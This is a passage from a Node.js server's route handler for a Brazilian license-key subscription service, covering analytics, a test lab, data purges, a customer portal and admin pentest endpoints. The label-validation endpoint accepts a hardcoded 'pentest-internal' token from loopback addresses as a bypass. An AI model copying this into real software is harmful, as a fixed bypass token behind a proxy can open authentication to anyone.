      sendAuthHtml(res, renderAnalyticsLogin(`⏳ Muitas tentativas. Aguarde ${mins} minuto(s).`), 429); return;
    }
    const form = await parseFormBody(req);
    const analyticsOk = checkAnalyticsLogin(form.get('pass'), form.get('totp'), ANALYTICS_PASS, ANALYTICS_TOTP_SECRET);
    if (analyticsOk) {
      const token = generateToken();
      analyticsSessions[token] = { expiresAt: new Date(Date.now() + 8*60*60*1000).toISOString(), createdAt: new Date().toISOString(), absoluteExpiresAt: new Date(Date.now() + SESSION_ABSOLUTE_LIMIT_MS).toISOString() };
      setSessionCookie(res, 'zv_an', token);
      res.writeHead(302, { Location: R_ANALYTICS }); res.end();
    } else {
      addSecurityAlert('BRUTE_FORCE', 'Analytics login falhou — credencial incorreta', ip);
      // Mensagem genérica quando TOTP está ativo: não revela se foi a senha
      // ou o código que errou. Sem TOTP configurado, texto idêntico ao de
      // sempre — zero mudança perceptível de UX nesse caso.
      sendAuthHtml(res, renderAnalyticsLogin(ANALYTICS_TOTP_SECRET ? 'Senha ou código incorreto.' : 'Senha incorreta.'));
    }
    return;
  }

  if (p === R_ANALYTICS+'/logout') {
    clearAnalyticsCookie(res);
    res.writeHead(302, { Location: R_ANALYTICS }); res.end(); return;
  }

  if ((p === R_ANALYTICS || p === R_ANALYTICS+'/') && req.method === 'GET') {
    if (!ANALYTICS_PASS) { res.writeHead(404); res.end('Not found'); return; }
    if (!isAnalyticsSession(req)) {
      clearAnalyticsCookie(res); // limpa cookie inválido (ex: após reinício do servidor)
      sendAuthHtml(res, renderAnalyticsLogin()); return;
    }
    sendHtml(res, await renderAnalyticsDashboard()); return;
  }

  if (p === R_ANALYTICS+'/export/csv' && req.method === 'GET') {
    if (!isAnalyticsSession(req)) { res.writeHead(302, { Location: R_ANALYTICS }); res.end(); return; }
    const payments = await getPayments({ limit: 10000 });
    const header = 'Data,Cliente,Email,Telefone,Produto,Valor,Status,Chave,Método';
    const rows = payments.map(p => {
      const fmtDate = iso => iso ? new Date(iso).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}) : '';
      return [
        fmtDate(p.paidAt), p.clientName, p.clientEmail, p.clientPhone,
        p.productName, (p.amount||0).toFixed(2).replace('.',','),
        p.approved ? 'APROVADO' : 'REJEITADO',
        p.keyCode || '', p.paymentMethod || ''
      ].map(csvCell).join(',');
    });
    const csv = [header, ...rows].join('\r\n');
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="zvm-pagamentos-${new Date().toISOString().slice(0,10)}.csv"`);
    res.writeHead(200); res.end('\uFEFF' + csv); return;
  }

  if (p === R_ANALYTICS+'/api/stats' && req.method === 'GET') {
    if (!isAnalyticsSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const stats = await getPaymentStats();
    sendJson(res, stats || {}); return;
  }

  // ── Laboratório de Testes (Analytics) ─────────────────────────────────
  // Cakto uses its own dedicated webhook authentication path.
  // Autenticação é só a sessão do Analytics + CSRF same-origin + rate limit
  // próprio. O browser manda SOMENTE planId — preço/limite/duração sempre
  // resolvem de ZVM_PLANS no servidor (ver simulateCommercialSale).
  if (p === R_ANALYTICS+'/api/lab/preview' && req.method === 'POST') {
    if (!isAnalyticsSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    if (!checkRateLimit(ip, 'analytics_lab_preview')) { sendAnalyticsRateLimited(res, ip, 'analytics_lab_preview'); return; }
    const body = await parseBody(req);
    try {
      const result = await simulateCommercialSale({
        planId: body.planId, name: body.name, email: body.email, phone: body.phone,
        method: body.method, execute: false,
      });
      console.log('[LAB] preview', maskEmail(body.email || ''));
      sendJson(res, result); return;
    } catch (e) {
      sendJson(res, { error: e.code || 'lab_preview_failed' }, 400); return;
    }
  }

  if (p === R_ANALYTICS+'/api/lab/simulate' && req.method === 'POST') {
    if (!isAnalyticsSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    if (!checkRateLimit(ip, 'analytics_lab_simulate')) { sendAnalyticsRateLimited(res, ip, 'analytics_lab_simulate'); return; }
    const body = await parseBody(req);
    try {
      const result = await simulateCommercialSale({
        planId: body.planId, name: body.name, email: body.email, phone: body.phone,
        method: body.method, execute: true, sendRealEmail: !!body.sendRealEmail,
      });
      console.log('[LAB] simulate', maskEmail(body.email || ''), maskTransactionId(result.txId || ''));
      sendJson(res, result); return;
    } catch (e) {
      sendJson(res, { error: e.code || 'lab_simulate_failed' }, 400); return;
    }
  }

  if ((p === R_ANALYTICS+'/api/lab/email-preview' || p === R_ANALYTICS+'/api/lab/email-send') && req.method === 'POST') {
    if (!isAnalyticsSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const isSend = p === R_ANALYTICS+'/api/lab/email-send';
    const emailRateType = isSend ? 'analytics_lab_email_send' : 'analytics_lab_email_preview';
    if (!checkRateLimit(ip, emailRateType)) { sendAnalyticsRateLimited(res, ip, emailRateType); return; }
    const body = await parseBody(req);
    const template = String(body.template || '');
    const chosenPlan = String(body.planId || '').toLowerCase().trim();
    const chosenKind = String(body.kind || '').toLowerCase().trim();
    if (chosenPlan || chosenKind) {
      const approved = ['start','pro','enterprise'].includes(chosenPlan) && ['new','renewal'].includes(chosenKind);
      const expected = approved ? 'delivery_' + (chosenKind === 'renewal' ? 'renewal_' : '') + chosenPlan : '';
      if (!approved || template !== expected) {
        sendJson(res, { error: 'lab_plan_template_mismatch' }, 400); return;
      }
    }
    // The license lab is now a typed operation: no generic plan fallback
    // and no accidental mismatch between the simulated plan and e-mail art.
    if (template.startsWith('delivery_') && !(chosenPlan && chosenKind)) {
      sendJson(res, { error: 'lab_explicit_plan_required' }, 400); return;
    }

    // Destinatário é sempre digitado explicitamente pelo admin — nunca
    // puxamos um cliente aleatório da base pra preview/teste de e-mail.
    const to = safeScalar(body.email, 160).toLowerCase();
    if (isSend && (!to || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(to))) { sendJson(res, { error: 'invalid_email' }, 400); return; }

    // Dados de amostra — NUNCA de um cliente real. code é obviamente fake
    // (prefixo DEMO), token de reset nunca é gravado em password_resets.
    const sampleExpiresAt = new Date(Date.now() + 30 * 86400000).toISOString();
    let built;
    try {
      if (['delivery_start','delivery_pro','delivery_enterprise','delivery_renewal_start','delivery_renewal_pro','delivery_renewal_enterprise'].includes(template)) {
        const tier = template.endsWith('_start') ? 'start_v2' : template.endsWith('_enterprise') ? 'enterprise_v2' : 'pro_v2';
        const info = { start_v2: ['START',1], pro_v2: ['PRO',3], enterprise_v2: ['ENTERPRISE',10] }[tier];
        built = buildKeyDeliveryEmail({
          code: 'ZV-DEMO-0000-0000', planId: tier, planLabel: info[0], maxUses: info[1],
          expiresAt: sampleExpiresAt, renewed: template.startsWith('delivery_renewal'), durationDays: 30,
          baseUrl: BASE_URL, extensionUrl: EXTENSION_URL, ctaPath: '/cliente'
        });
      } else if (template === 'expiry_warning') {
        built = buildKeyExpiryWarningEmail({ code: 'ZV-DEMO-0000-0000', hoursLeft: 48, planLabel: 'Padrão', maxUses: 3, expiresAt: new Date(Date.now() + 48 * 3600000).toISOString(), baseUrl: BASE_URL, ctaPath: '/cliente' });
      } else if (template === 'password_reset') {
        built = buildPasswordResetEmail(`${BASE_URL}/cliente/redefinir?token=demo-nao-valido`);
      } else {
        sendJson(res, { error: 'invalid_template' }, 400); return;
      }
    } catch (e) { sendJson(res, { error: 'template_build_failed' }, 500); return; }

    if (!isSend) {
      console.log('[LAB] email-preview', template);
      try {
        const prepared=await prepareKeyDeliveryArtwork(built,{preview:true});
        sendJson(res,{subject:built.subject,html:prepared.html}); return;
      } catch (_) {
        sendJson(res,{error:'approved_artwork_unavailable'},503); return;
      }
    }
    const result = await sendEmail({ to, subject: `[TESTE] ${built.subject}`, html: built.html, artwork: built.artwork, text: built.text });
    console.log('[LAB] email-send', template, maskEmail(to), result.ok ? 'ok' : `falhou: ${result.reason || ''}`);
    // reason vem só de mailer.js: mensagem de validação do Resend, "RESEND_API_KEY
    // não configurado" ou erro de rede — nunca a API key nem outro segredo.
    sendJson(res, { ok: result.ok, reason: result.ok ? null : result.reason }); return;
  }

  // ── Limpeza de histórico do Analytics ─────────────────────────────────
  // mode é a ÚNICA entrada de negócio aceita do navegador — o filtro real
  // vem sempre de ANALYTICS_PURGE_FILTERS (definido só no servidor, ver
  // comentário lá). Nenhuma rota aqui aceita nome de collection nem filtro
  // do cliente. GET nunca chega nestas rotas (ambas exigem POST). A lógica
  // de negócio mora em previewAnalyticsPurge/executeAnalyticsPurge (testável
  // com deps.db mockado) — aqui só auth/CSRF/rate-limit e tradução de erro.
  if (p === R_ANALYTICS+'/api/purge/preview' && req.method === 'POST') {
    if (!isAnalyticsSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    if (!checkRateLimit(ip, 'analytics_purge_preview')) { sendAnalyticsRateLimited(res, ip, 'analytics_purge_preview'); return; }
    const body = await parseBody(req);
    try {
      const preview = await previewAnalyticsPurge(String(body.mode || ''));
      console.log('[ANALYTICS][PURGE][PREVIEW]', `mode=${preview.mode}`, `scoped=${preview.scoped}`);
      sendJson(res, { ...preview, collections: { payments: preview.totalRecords } }); return;
    } catch (e) { sendJson(res, { error: e.code || 'preview_failed' }, e.code === 'invalid_mode' ? 400 : 500); return; }
  }

  if (p === R_ANALYTICS+'/api/purge/execute' && req.method === 'POST') {
    if (!isAnalyticsSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    if (!checkRateLimit(ip, 'analytics_purge_execute')) { sendAnalyticsRateLimited(res, ip, 'analytics_purge_execute'); return; }
    const body = await parseBody(req);
    const mode = String(body.mode || '');
    try {
      const { deletedCount, verifiedEmpty } = await executeAnalyticsPurge({ mode, confirmText: body.confirmText, expectedCount: body.expectedCount });
      // Log só com contagens — nunca e-mail, chave, txId ou qualquer campo
      // do documento removido.
      console.log('[ANALYTICS][PURGE]', `mode=${mode}`, `deleted=${deletedCount}`, `verifiedEmpty=${verifiedEmpty}`);
      if (!verifiedEmpty) console.error('[ANALYTICS][PURGE] verificação pós-exclusão encontrou registros restantes no escopo — investigar', `mode=${mode}`);
      sendJson(res, { ok: true, deleted: { payments: deletedCount }, totalDeleted: deletedCount, verifiedEmpty }); return;
    } catch (e) {
      const statusByCode = { invalid_mode: 400, confirmation_required: 400, count_changed: 409 };
      sendJson(res, { error: e.code || 'purge_failed', before: e.before }, statusByCode[e.code] || 500); return;
    }
  }

  if (p === '/cakto/webhook' && req.method === 'POST') {
    await handleCaktoWebhook(req, res, url, ip);
    return;
  }

  // Legacy commercial ingress retired; Cakto is the sole production payment authority.

  if (p === '/client/status' && req.method === 'POST') {
    if (!isInternalAuditProbe(req) && !checkRateLimit(ip, 'api')) { sendJson(res, { error: 'rate_limited' }, 429); return; }
    const _cl = parseInt(req.headers['content-length'] || '0', 10);
    if (_cl > 256) { sendJson(res, { error: 'payload_too_large' }, 400); return; }
    const body = await parseBody(req);
    const _rawKey = (typeof body.key === 'string' ? body.key : '').trim().toLowerCase();
    if (!/^[a-z0-9\-]{20}$/.test(_rawKey)) { sendJson(res, { error: 'invalid_key' }, 400); return; }
    const code = sanitizeId(_rawKey, 20);
    if (!code) { sendJson(res, { error: 'not_found' }, 404); return; }
    if (!await ensureKeyLoaded(code)) { sendJson(res, { error: 'not_found' }, 404); return; }
    const k = keys[code];

    sendJson(res, {
      label:       k.label || 'Cliente',
      active:      k.active && !isKeyExpired(k),
      expired:     isKeyExpired(k),
      expiresAt:   k.expiresAt || null,
      activatedAt: k.activatedAt || null,
      lastUsed:    k.lastUsed || null,
      phones:      (k.phones || []).length,
      phoneList:   (k.phones || []).map((ph, i) => ({ idx: i, display: ph })),
      maxUses:     k.maxUses === -1 ? null : (k.maxUses > 0 ? k.maxUses : MAX_USES),
      hoursLeft:   hoursUntilExpiry(k),
      daysLeft:    daysUntilExpiry(k),
      deferred:    !!(k.expireDuration && !k.expiresAt),
      warnCount:   k.warnCount || 0,
    }); return;
  }

  if (p === '/client/remove-phone' && req.method === 'POST') {
    if (!isInternalAuditProbe(req) && !checkRateLimit(ip, 'api')) { sendJson(res, { error: 'rate_limited' }, 429); return; }
    const _clRm = parseInt(req.headers['content-length'] || '0', 10);
    if (_clRm > 256) { sendJson(res, { error: 'payload_too_large' }, 400); return; }
    const body    = await parseBody(req);
    const _rawRmKey = (typeof body.key === 'string' ? body.key : '').trim().toLowerCase();
    if (!/^[a-z0-9\-]{20}$/.test(_rawRmKey)) { sendJson(res, { error: 'invalid_key' }, 400); return; }
    const keyCode = sanitizeId(_rawRmKey, 20);
    const phoneIdx = body.phoneIdx != null ? parseInt(body.phoneIdx) : -1;
    const phoneTxt = (body.phone||'').trim();
    if (!keyCode) { sendJson(res, { error: 'not_found' }, 404); return; }
    if (phoneIdx < 0 && !phoneTxt) { sendJson(res, { error: 'phone obrigatorio' }, 400); return; }
    if (!await ensureKeyLoaded(keyCode)) { sendJson(res, { error: 'not_found' }, 404); return; }
    const phones = keys[keyCode].phones || [];
    const phone = resolvePhoneToRemove(phones, { phoneIdx, phoneTxt });
    if (!phone) { sendJson(res, { error: 'numero nao encontrado' }, 404); return; }
    let savedClientPhones;
    try { savedClientPhones = await mutateAdminKeyRecordStrict(keyCode, draft => { removePhoneFromKey(draft, phone); }); }
    catch (e) { console.error('[CLIENT] remove phone persist:', e.message); sendJson(res, { ok:false, error:'temporarily_unavailable', retryable:true }, 503); return; }
    sendJson(res, { ok: true, phones: savedClientPhones.phones }); return;
  }

  if (p === '/politica' && req.method === 'GET') {
    res.writeHead(301, { Location: '/privacidade' }); res.end(); return;
  }

  if (p === '/faq' && req.method === 'GET') {
    const _sess = isPortalSession(req) ? getPortalUser(req) : null;
    sendPublicHtml(res, renderStandaloneFaqPage(_sess)); return;
  }

  if (p === '/planos' && req.method === 'GET') {
    const sess = isPortalSession(req) ? getPortalUser(req) : null;
    let portalUser = null;
    if (sess) {
      try {
        const db = await getMongoDb();
        const saved = await db.collection('portal_users').findOne({ _id: sess.email }, { projection: { _id: 1, email: 1, keyCode: 1 } });
        if (saved) portalUser = { ...sess, email: saved.email || sess.email, keyCode: saved.keyCode || null };
        else clearSessionCookie(res, 'zv_portal');
      } catch (error) {
        console.error('[Portal] checkout link target indisponivel:', error.message);
        sendPublicHtml(res, renderPortalLicenseUnavailable('plans'), 503); return;
      }
    }
    sendPublicHtml(res, renderPlanosPage(portalUser)); return;
  }

  if (p === '/privacidade' && req.method === 'GET') {
    const _sess = isPortalSession(req) ? getPortalUser(req) : null;
    sendPublicHtml(res, renderStandalonePrivacyPage(_sess)); return;
  }

  if (p === '/termos' && req.method === 'GET') {
    const _sess = isPortalSession(req) ? getPortalUser(req) : null;
    const locale = resolvePublicLocale(req).locale;
    sendPublicHtml(res, renderStandaloneTermsPage(_sess, locale)); return;
  }

  // ── Label validation endpoint (usado pelo pentest interno) ──────────────
  if (p === R_EXT + '/v3/labels' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'api')) {
      sendJson(res, { ok: false, error: 'rate_limited' }, 429); return;
    }
    const _rawTok = String(req.headers['x-access-token'] || '').trim().toLowerCase().slice(0, 64);
    const _raddr = req.socket?.remoteAddress || '';
    const _isLoopback = _raddr === '127.0.0.1' || _raddr === '::1' || _raddr === '::ffff:127.0.0.1';
    const _isPentestInternal = _isLoopback && _rawTok === 'pentest-internal';
    // sanitizeId impede que `__proto__`/`constructor` sejam usados como índice em
    // keys[] e retornem objetos herdados de Object.prototype em vez de uma chave real.
    const accessToken = sanitizeId(_rawTok, 64);
    const _tokValid = Object.prototype.hasOwnProperty.call(keys, accessToken) && !!keys[accessToken]?.active;
    if (!accessToken || (!_tokValid && !_isPentestInternal)) {
      sendJson(res, { ok: false, msg: 'invalid_access_token' }, 403); return;
    }
    const body = await parseBody(req);
    if (typeof body.label !== 'string') {
      sendJson(res, { ok: false, error: 'nosql_injection_detected' }, 400); return;
    }
    if (body.label.length > 60) {
      sendJson(res, { ok: false, error: 'label_too_long' }, 400); return;
    }
    sendJson(res, { ok: true }); return;
  }

  // ── Motor de Pentest Interno (admin-gated) ──────────────────────────────
  if (p === R_ADMIN + '/api/pentest/run' && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    sendJson(res, await runInternalSecurityAudit()); return;
  }

  // ── Alertas de Segurança Recentes (admin-gated) ──────────────────────────
  if (p === R_ADMIN + '/api/pentest/alerts' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    sendJson(res, { ok: true, alerts: securityAlerts.slice(0, 50) }); return;
  }

  // ── Limpar Logs de Segurança (admin-gated) ────────────────────────────────
  if (p === R_ADMIN + '/api/security/alerts/clear' && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    securityAlerts = [];
    saveSecurityAlerts().catch(() => {});
    sendJson(res, { ok: true }); return;
  }

  if (p === '/api/checkkey' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'checkkey')) { sendJson(res, { valid: false, error: 'Muitas tentativas. Aguarde.' }, 429); return; }
    try {
      const body = await parseBody(req);
      const code = (body.code || '').trim().toLowerCase().slice(0, 64);
      if (!code) { sendJson(res, { valid: false, error: 'Código não informado.' }); return; }
      const _ck = await ensureKeyLoadedEx(code);
      // Banco fora do ar: nao afirmar que a chave e invalida (o cliente veria
      // "chave invalida" durante uma queda). Devolve erro temporario.
      if (_ck.dbError) { sendJson(res, { error: 'temporarily_unavailable', retryable: true }, 503); return; }
      if (!_ck.found) { sendJson(res, { valid: false }); return; }
      const k = keys[code] || {};
      const now = Date.now();
      const expired = k.expiresAt ? new Date(k.expiresAt).getTime() < now : false;
      if (expired) { sendJson(res, { valid: false, expired: true }); return; }
      sendJson(res, {
        valid: true,
        plan: k.planId || k.plan_id || 'Pro',
        expiresAt: k.expiresAt || null,
        deviceLimit: k.deviceLimit || k.maxDevices || null,
        activatedAt: k.activatedAt || null,
      });
    } catch(e) { sendJson(res, { valid: false, error: 'Erro interno.' }, 500); }
    return;
  }

  if (req.method === 'GET' && p === '/') {
    // Public owner landing. Checkout remains under /planos (with the existing Cakto gates).
    sendPublicHtml(res, renderOwnerSalesLanding({
      plans: ZVM_PUBLIC_PLANS,
      salesPaused: ZVM_SALES_PAUSED,
      escHtml,
      testimonialsJson: process.env.ZVM_SALES_TESTIMONIALS_JSON || '',
      supportUrl: ZVM_SUPPORT_URL
    })); return;
  }
  if (req.method === 'GET' && p === '/verificar') {
    res.writeHead(302, { Location: getVerifyRedirect(isPortalSession(req)) }); res.end(); return;
  }
  if (req.method === 'GET' && (p === '/plans/manage' || p === '/plans/new' || p === '/dashboard/chaves' || p.startsWith('/unauthorized') || p.startsWith('/funnels') || p.startsWith('/labels'))) {
    res.writeHead(302, { Location: '/cliente' }); res.end(); return;
  }

  // ═══════════════════ PORTAL DO CLIENTE ═════════════════════
  if (p === '/cliente/planos' && req.method === 'GET') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente?redir=/cliente/planos' }); res.end(); return; }
    const sess=getPortalUser(req);
    try {
      const db=await getMongoDb();
      const user=await db.collection('portal_users').findOne({ _id:sess.email });
      if (!user) { clearSessionCookie(res,'zv_portal'); sendAuthHtml(res,renderStandalonePortalLogin()); return; }
      const keyData = user.keyCode ? await readPortalKeySnapshot(user.keyCode, { db }) : null;
      sendAuthHtml(res,renderStandalonePortalPlans(user,keyData)); return;
    } catch(e) { console.error('[Portal] plans temporarily unavailable:',e.message); sendAuthHtml(res,renderPortalLicenseUnavailable('plans'),503); return; }
  }

  if (p === '/cliente' || p === '/cliente/') {
    const requestedRedirect = safeLocalRedirect(url.searchParams.get('redir') || '');
    if (!isPortalSession(req)) { sendAuthHtml(res, renderStandalonePortalLogin('', url.searchParams.get('copy') === '1' ? '/cliente?copy=1' : requestedRedirect)); return; }
    if (requestedRedirect && requestedRedirect !== '/cliente') { res.writeHead(302, { Location: requestedRedirect }); res.end(); return; }
    const sess = getPortalUser(req);
    try {
      const db = await getMongoDb();
      const user = await db.collection('portal_users').findOne({ _id: sess.email });
      if (!user) { clearSessionCookie(res, 'zv_portal'); sendAuthHtml(res, renderStandalonePortalLogin()); return; }
      const keyData = user.keyCode ? await readPortalKeySnapshot(user.keyCode, { db }) : null;
      const _dashOk = url.searchParams.get('ok');
      const _dashMsg = _dashOk === '2fa_off' ? '2FA desativado com sucesso.' : _dashOk === '1' ? 'Operação realizada com sucesso.' : '';
      const _deviceFailure = url.searchParams.get('device');
      const _dashDeviceMsg = _deviceFailure === 'changed'
        ? 'A lista de dispositivos mudou antes da remoção. Nenhum outro número foi removido. Atualize e tente novamente.'
        : _deviceFailure === 'refresh'
          ? 'Esta página está desatualizada. Atualize a lista de dispositivos antes de remover um número.'
          : '';
      sendAuthHtml(res, renderStandalonePortalDashboard(user, keyData, _dashMsg, _dashDeviceMsg)); return;
    } catch(e) { console.error('[Portal] dashboard temporarily unavailable:', e.message); sendAuthHtml(res, renderPortalLicenseUnavailable('overview'), 503); return; }
  }

  if (p === '/cliente/login' && req.method === 'GET') {
    const _loginMsg = url.searchParams.get('msg');
    if (_loginMsg === 'email_changed') { sendAuthHtml(res, renderStandalonePortalLogin('', '', 'E-mail alterado com sucesso! Faça login com o novo e-mail.')); return; }
    res.writeHead(302, { Location: '/cliente' }); res.end(); return; }

  if (p === '/cliente/login' && req.method === 'POST') {
    if (!requireSameOriginPost(req)) { sendHtml(res, 'Forbidden', 403); return; }
    if (!checkRateLimit(ip, 'login')) { sendAuthHtml(res, renderStandalonePortalLogin('Muitas tentativas. Aguarde 10 minutos.'), 429); return; }
    const form = await parseFormBody(req);
    const email = (form.get('email')||'').toLowerCase().trim().slice(0,100);
    const pass  = (form.get('pass')||'').slice(0,128);
    const redir = safeLocalRedirect((form.get('redir')||'').slice(0,200));
    if (!email || !pass) { sendAuthHtml(res, renderStandalonePortalLogin('Preencha todos os campos.')); return; }
    try {
      const db = await getMongoDb();
      const user = await db.collection('portal_users').findOne({ _id: email });
      if (!user) { sendAuthHtml(res, renderStandalonePortalLogin('E-mail ou senha inválidos.')); return; }
      const passOk = await verifyPortalPassword(pass, user);
      if (!passOk) { sendAuthHtml(res, renderStandalonePortalLogin('E-mail ou senha inválidos.')); return; }
      maybeRehashPortalPassword(db, email, pass, user);
      db.collection('portal_users').updateOne({ _id: email }, { $set: { lastLogin: new Date().toISOString() } }).catch(()=>{});
      if (portalTotpHasSecret(user)) {
        if (user.totpSecret && !user.totpSecretEnc) await migratePortalTotpLegacy(db, user, email);
        const pendingToken = generateToken();
        portalSessions[pendingToken] = { email, name: user.name, pending2fa: true, redir: redir||'', expiresAt: new Date(Date.now()+5*60*1000).toISOString() };
        setSessionCookie(res, 'zv_portal', pendingToken, 300);
        res.writeHead(302, { Location: '/cliente/2fa/verificar' }); res.end();
      } else {
        const token = generateToken();
        portalSessions[token] = { email, name: user.name, expiresAt: new Date(Date.now()+24*60*60*1000).toISOString() };
        setSessionCookie(res, 'zv_portal', token, 86400);
        const dest = redir || '/cliente';
        res.writeHead(302, { Location: dest }); res.end();
      }
    } catch(e) { console.error('[Portal] login:', e.message); sendAuthHtml(res, renderStandalonePortalLogin('Estamos com uma indisponibilidade temporária. Tente novamente em alguns instantes.')); return; }
    return;
  }

  if (p === '/cliente/registro' && req.method === 'GET') { sendAuthHtml(res, renderStandalonePortalRegister('', {}, safeLocalRedirect(url.searchParams.get('redir') || ''))); return; }

  if (p === '/cliente/registro' && req.method === 'POST') {
    if (!requireSameOriginPost(req)) { sendHtml(res, 'Forbidden', 403); return; }
    if (!checkRateLimit(ip, 'login')) { sendAuthHtml(res, renderStandalonePortalRegister('Muitas tentativas.'), 429); return; }
    const form = await parseFormBody(req);
    const name    = (form.get('name')||'').trim().slice(0,80);
    const email   = (form.get('email')||'').toLowerCase().trim().slice(0,100);
    const phone   = (form.get('phone')||'').replace(/\D/g,'').slice(0,20);
    const keycode = ((form.get('keycode')||'').toLowerCase().trim()).replace(/[^a-z0-9\-_]/g,'').slice(0,30);
    const pass    = (form.get('pass')||'').slice(0,128);
    const pass2   = (form.get('pass2')||'').slice(0,128);
    const redir   = safeLocalRedirect((form.get('redir')||'').slice(0,200));
    const vals = { name, email, phone, keycode };
    if (!name || !email || !pass) { sendAuthHtml(res, renderStandalonePortalRegister('Preencha nome, e-mail e senha.', vals, redir)); return; }
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) { sendAuthHtml(res, renderStandalonePortalRegister('E-mail inválido.', vals, redir)); return; }
    if (pass.length < 8) { sendAuthHtml(res, renderStandalonePortalRegister('Senha: mínimo 8 caracteres.', vals, redir)); return; }
    if (pass !== pass2) { sendAuthHtml(res, renderStandalonePortalRegister('As senhas não coincidem.', vals, redir)); return; }
    try {
      const db = await getMongoDb();
      const existing = await db.collection('portal_users').findOne({ _id: email });
      if (existing) { sendAuthHtml(res, renderStandalonePortalRegister('E-mail já cadastrado.', vals, redir)); return; }
      if (keycode) {
        await ensureKeyLoaded(keycode);
        if (!keys[keycode]) { sendAuthHtml(res, renderStandalonePortalRegister('Chave não encontrada. Deixe em branco para vincular depois.', vals, redir)); return; }
        // Guarda de aplicação: uma licença comercial pertence a uma única conta
        // do portal. Sem isto, a mesma keyCode poderia ser vinculada a vários
        // portal_users simultaneamente (cada um veria/gerenciaria a licença do
        // outro). Checagem em tempo de escrita — não depende de índice único.
        const alreadyLinked = await db.collection('portal_users').findOne({ keyCode: keycode });
        if (alreadyLinked) { sendAuthHtml(res, renderStandalonePortalRegister('Esta chave já está vinculada a outra conta. Entre em contato com o suporte se isso for um engano.', vals, redir)); return; }
      }
      const newPass = await hashNewPortalPassword(pass);
      await db.collection('portal_users').insertOne({ _id: email, name, email, phone: phone||null, ...newPass, keyCode: keycode||null, createdAt: new Date().toISOString() });
      const token = generateToken();
      portalSessions[token] = { email, name, expiresAt: new Date(Date.now()+24*60*60*1000).toISOString() };
      setSessionCookie(res, 'zv_portal', token, 86400);
      res.writeHead(302, { Location: redir || '/cliente' }); res.end();
    } catch(e) { console.error('[Portal] registro:', e.message); sendAuthHtml(res, renderStandalonePortalRegister('Erro ao criar conta.', vals, redir)); return; }
    return;
  }

  if (p === '/cliente/logout') {
    const m = (req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/);
    if (m) delete portalSessions[m[1]];
    clearSessionCookie(res, 'zv_portal');
    res.writeHead(302, { Location: '/cliente' }); res.end(); return;
  }

  if (p === '/cliente/vincular') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (req.method === 'GET') { sendAuthHtml(res, renderStandalonePortalLinkKey('', '', getPortalUser(req))); return; }
    if (req.method === 'POST') {
      if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
      const sess = getPortalUser(req);
      const form = await parseFormBody(req);
      const keycode = ((form.get('keycode')||'').toLowerCase().trim()).replace(/[^a-z0-9\-_]/g,'').slice(0,30);
      if (!keycode) { sendAuthHtml(res, renderStandalonePortalLinkKey('Informe o código da chave.', '', sess)); return; }
      await ensureKeyLoaded(keycode);
      if (!keys[keycode]) { sendAuthHtml(res, renderStandalonePortalLinkKey('Chave não encontrada.', '', sess)); return; }
      try {
        const db = await getMongoDb();
        // Guarda de aplicação: uma licença comercial pertence a uma única conta
        // do portal. Sem isto, dois portal_users diferentes poderiam vincular a
        // mesma keyCode simultaneamente (cada um veria/gerenciaria a licença do
        // outro). Checagem em tempo de escrita — não depende de índice único.
        const alreadyLinked = await db.collection('portal_users').findOne({ keyCode: keycode, _id: { $ne: sess.email } });
        if (alreadyLinked) { sendAuthHtml(res, renderStandalonePortalLinkKey('Esta chave já está vinculada a outra conta. Entre em contato com o suporte se isso for um engano.', '', sess)); return; }
        await db.collection('portal_users').updateOne({ _id: sess.email }, { $set: { keyCode: keycode } });
        res.writeHead(302, { Location: '/cliente' }); res.end(); return;
      } catch(e) { sendAuthHtml(res, renderStandalonePortalLinkKey('Erro ao vincular.', '', sess)); return; }
    }
  }

  if (p === '/cliente/desvincular' && req.method === 'POST') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const sess = getPortalUser(req);
    try {
      const db = await getMongoDb();
      await db.collection('portal_users').updateOne({ _id: sess.email }, { $unset: { keyCode: '' } });
    } catch(e) { /* falha silenciosa — redireciona de qualquer forma */ }
    res.writeHead(302, { Location: '/cliente' }); res.end(); return;
  }

  if (p === '/cliente/dispositivos/remover' && req.method === 'POST') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const sess = getPortalUser(req);
    const form = await parseFormBody(req);
    // A identidade vem da lista que o cliente realmente visualizou, nunca
    // da posicao atual: a ordem pode mudar depois que a pagina foi aberta.
    const requestedPhone = String(form.get('phone') || '');
    const requestedKeyCode = String(form.get('keyCode') || '');
    if (!requestedPhone || requestedPhone.length > 64 || !normalizePhone(requestedPhone) ||
